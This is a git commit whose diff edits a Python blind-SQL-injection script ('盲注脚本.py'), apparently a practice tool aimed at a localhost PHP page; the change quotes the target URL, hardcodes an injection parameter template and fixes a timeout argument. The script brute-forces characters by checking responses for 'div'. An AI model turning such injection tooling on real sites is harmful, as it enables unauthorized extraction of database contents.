d16d381aad96a3ac9dec0cc51261f198a8e03034
whb54012 <1226844928@qq.com>
2026-07-27 11:17:11 +0000

    自动提交：更新 ${2026/7/27 19:17ilenPM17e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -4,12 +4,13 @@ import warnings
 warnings.filterwarnings("ignore")
 result=int(input("输入查找长度"))
 # url = input("输入url及注入点")
-url=http://localhost:3000/%E7%BD%91%E9%A1%B5/%E4%B8%BB%E9%A1%B5/%E9%9F%B3%E4%B9%90.php
-data=input("输入注入语句")
+url="http://localhost:3000/%E7%BD%91%E9%A1%B5/%E4%B8%BB%E9%A1%B5/%E9%9F%B3%E4%B9%90.php"
+# data=input("输入注入语句")
+data='?c=11{}{}123'
 def fun(url,result,result2):
     for i in range(result2):
         # try:
-            reponse=requests.get(url+data.format(result,i),Timeout=0.5)
+            reponse=requests.get(url+data.format(result,i),timeout=0.5)
             if 'div' in reponse.text:
                 print(result,url+data.format(result,i),chr(i))
                 break
